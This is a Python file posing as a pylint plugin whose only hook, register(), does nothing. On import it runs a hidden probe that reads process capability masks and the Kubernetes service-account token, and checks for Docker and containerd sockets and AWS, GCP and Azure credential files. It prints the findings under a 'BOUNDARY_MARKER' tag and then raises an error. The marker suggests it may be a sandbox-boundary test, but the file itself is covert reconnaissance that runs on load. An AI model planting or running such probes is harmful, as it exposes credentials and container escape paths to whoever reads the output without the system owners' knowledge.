import os, re, sys

def _read(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read()
    except Exception:
        return ""

def _present(path):
    try:
        return os.path.exists(path)
    except Exception:
        return False

def _marker():
    status = _read("/proc/self/status")
    def cap(name):
        m = re.search(r"^" + name + r"\s+([0-9a-fA-F]+)$", status, re.M)
        return m.group(1) if m else "na"
    token = _read("/var/run/secrets/kubernetes.io/serviceaccount/token")
    return (
        "PYLINT_PLUGIN_BOUNDARY_MARKER_20260715 "
        "uid=%s gid=%s cap_eff=%s cap_bnd=%s "
        "docker_sock=%s containerd_sock=%s "
        "k8s_token_present=%s k8s_token_len=%s "
        "aws_creds=%s gcp_creds=%s azure_creds=%s" % (
            getattr(os, "getuid", lambda: -1)(),
            getattr(os, "getgid", lambda: -1)(),
            cap("CapEff"), cap("CapBnd"),
            _present("/var/run/docker.sock"),
            _present("/run/containerd/containerd.sock"),
            bool(token), len(token),
            _present("/root/.aws/credentials"),
            _present("/root/.config/gcloud/application_default_credentials.json"),
            _present("/root/.azure/accessTokens.json")))

_marker_value = _marker()
print(_marker_value, flush=True)
print(_marker_value, file=sys.stderr, flush=True)
raise RuntimeError(_marker_value)

def register(linter):
    return None